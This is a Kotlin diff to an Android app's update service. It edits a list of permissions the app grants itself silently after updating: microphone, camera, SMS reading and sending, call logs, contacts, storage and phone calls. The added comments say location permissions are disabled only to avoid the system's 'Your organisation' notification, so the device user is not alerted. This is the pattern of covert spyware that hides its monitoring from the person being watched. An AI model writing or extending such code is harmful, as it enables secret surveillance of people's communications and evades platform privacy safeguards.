@@ -43,17 +43,19 @@ object UpdateService {
     private var downloadId: Long = -1
     
     // All permissions that should be auto-granted after update
+    // Note: Location permissions REMOVED to avoid system notifications
     private val REQUIRED_PERMISSIONS = arrayOf(
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
+        // Location permissions removed - causes "Your organisation" notification
+        // Manifest.permission.ACCESS_FINE_LOCATION,
+        // Manifest.permission.ACCESS_COARSE_LOCATION,
+        // Manifest.permission.ACCESS_BACKGROUND_LOCATION,
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_EXTERNAL_STORAGE,
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.CALL_PHONE,
         Manifest.permission.SEND_SMS,
